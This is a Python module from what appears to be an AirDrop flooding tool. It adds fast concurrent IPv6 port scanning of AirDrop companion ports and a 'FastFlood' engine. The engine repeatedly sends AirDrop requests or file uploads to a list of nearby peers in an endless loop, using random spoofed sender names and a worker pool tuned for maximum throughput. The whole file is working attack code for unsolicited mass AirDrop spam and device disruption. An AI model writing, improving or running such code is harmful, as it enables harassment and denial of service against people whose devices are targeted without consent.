"""
Fast concurrency engine for find / send / flood.

The stock paths probe TCP ports serially and spawn one thread per flood attempt
(dropping work silently when the semaphore is full). This module adds:

  * async concurrent port probing  -> faster discovery for find / send
  * a bounded ThreadPoolExecutor flood with real backpressure and stats
    (no silent drops, accurate attempt/success counts)

Everything here is additive; the original engine in actions.py is untouched.
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import socket
import threading
import time
from pathlib import Path

from config import log
from discovery import discover_ports
from modern import ModernAirDrop
from netutil import bind_to_iface, random_sender_name, scoped
from peers import PeerPorts


# ---------------------------------------------------------------------------
# Concurrent TCP port probing (asyncio)
# ---------------------------------------------------------------------------

async def _probe_one(host: str, port: int, iface: str, timeout: float) -> tuple[int, bool]:
    loop = asyncio.get_running_loop()
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.setblocking(False)
    bind_to_iface(s, iface)
    try:
        await asyncio.wait_for(loop.sock_connect(s, (scoped(host, iface), port)), timeout)
        return port, True
    except (OSError, asyncio.TimeoutError):
        return port, False
    finally:
        s.close()


async def _probe_ports_async(
    host: str, ports: list[int], iface: str, timeout: float
) -> list[int]:
    tasks = [_probe_one(host, p, iface, timeout) for p in ports]
    results = await asyncio.gather(*tasks)
    open_set = {p for p, ok in results if ok}
    # preserve the caller's port order
    return [p for p in ports if p in open_set]


def probe_ports(host: str, ports: list[int], iface: str, timeout: float = 0.8) -> list[int]:
    """Probe many TCP ports on one host concurrently. Returns open ports (input order)."""
    if not ports:
        return []
    return asyncio.run(_probe_ports_async(host, list(dict.fromkeys(ports)), iface, timeout))


def fast_open_companion_ports(peer: PeerPorts, iface: str, timeout: float = 0.8) -> list[int]:
    """Concurrent replacement for PeerPorts.open_companion_ports (same result, faster)."""
    return probe_ports(peer.host, peer.companion_candidates(), iface, timeout)


# Ephemeral companion/asquic ports from poke + Kali send captures (52xxx / 58xxx / 60xxx).
_COMPANION_SCAN_PORTS = (
    list(range(52000, 53100))
    + list(range(58000, 59100))
    + list(range(60000, 60200))
)


def scan_companion_ephemeral(host: str, iface: str, timeout: float = 0.08) -> list[int]:
    """Parallel TCP scan when mDNS misses the post-Accept companion port."""
    log(f"ephemeral TCP scan {len(_COMPANION_SCAN_PORTS)} ports on {host} ...", level="dbg")
    open_ports = probe_ports(host, _COMPANION_SCAN_PORTS, iface, timeout)
    if open_ports:
        log(f"ephemeral scan: open TCP on {host}: {open_ports[:8]}", level="dbg")
    else:
        log("ephemeral scan: no open TCP in scanned ranges", level="dbg")
    return open_ports


# ---------------------------------------------------------------------------
# Bounded flood engine (ThreadPoolExecutor, no silent drops)
# ---------------------------------------------------------------------------

class FastFlood:
    """
    Continuous flood with a fixed worker pool and bounded in-flight work.

    Unlike the stock flood (thread-per-attempt + non-blocking semaphore that
    silently drops overflow), this keeps exactly `workers` attempts in flight
    and blocks the scheduler when saturated, so every counted attempt runs.
    """

    def __init__(
        self,
        iface: str,
        *,
        file_path: Path | None,
        workers: int,
        delay: float,
        timeout: float,
        legacy_tls: bool,
        ask_only: bool,
    ) -> None:
        self.iface = iface
        self.file_path = file_path
        self.workers = max(1, workers)
        self.delay = delay
        self.timeout = timeout
        self.legacy_tls = legacy_tls
        self.ask_only = ask_only
        self.modern = ModernAirDrop(iface, timeout=timeout)
        self._inflight = threading.Semaphore(self.workers)
        self._lock = threading.Lock()
        self.attempts = 0
        self.done = 0
        self.ok = 0

    def _one(self, peer: str) -> None:
        from actions import execute_airdrop_action

        try:
            sender = random_sender_name()
            ports = discover_ports(peer, self.iface)
            # concurrent companion probe (fast path)
            open_companion = fast_open_companion_ports(ports, self.iface, 0.8)
            if open_companion:
                ports.clink = open_companion[0]
            log(
                f"-> {peer} as {sender!r} companion={ports.companion_candidates()} "
                f"open={open_companion} tls={ports.tls}"
            )
            fpath = self.file_path or Path("/tmp/poke.txt")
            ok = execute_airdrop_action(
                peer, ports, self.iface, sender, self.modern,
                file_path=fpath,
                do_upload=bool(self.file_path and not self.ask_only),
                prefer_tls=self.legacy_tls,
            )
            with self._lock:
                self.done += 1
                self.ok += 1 if ok else 0
        except Exception as exc:
            with self._lock:
                self.done += 1
            log(f"{peer}: {exc}", level="dbg")
        finally:
            self._inflight.release()

    def run(self, peers: list[str]) -> None:
        log(
            f"FASTFLOOD peers={len(peers)} workers={self.workers} "
            f"delay={self.delay}s legacy_tls={self.legacy_tls}"
        )
        pool = concurrent.futures.ThreadPoolExecutor(max_workers=self.workers)
        last_report = time.time()
        try:
            while True:
                for peer in peers:
                    self._inflight.acquire()  # backpressure: block when saturated
                    with self._lock:
                        self.attempts += 1
                    pool.submit(self._one, peer)
                    if self.delay > 0:
                        time.sleep(self.delay)
                    if time.time() - last_report >= 5.0:
                        with self._lock:
                            log(
                                f"flood stats: attempts={self.attempts} done={self.done} "
                                f"ok={self.ok} inflight={self.attempts - self.done}"
                            )
                        last_report = time.time()
        except KeyboardInterrupt:
            log(f"stopping — attempts={self.attempts}, waiting for in-flight ...")
        finally:
            pool.shutdown(wait=True)
            log(f"flood ended: attempts={self.attempts} done={self.done} ok={self.ok}")


def fast_flood(
    peers: list[str],
    iface: str,
    *,
    file_path: Path | None,
    workers: int,
    delay: float,
    timeout: float,
    legacy_tls: bool,
    ask_only: bool,
) -> None:
    FastFlood(
        iface,
        file_path=file_path,
        workers=workers,
        delay=delay,
        timeout=timeout,
        legacy_tls=legacy_tls,
        ask_only=ask_only,
    ).run(peers)
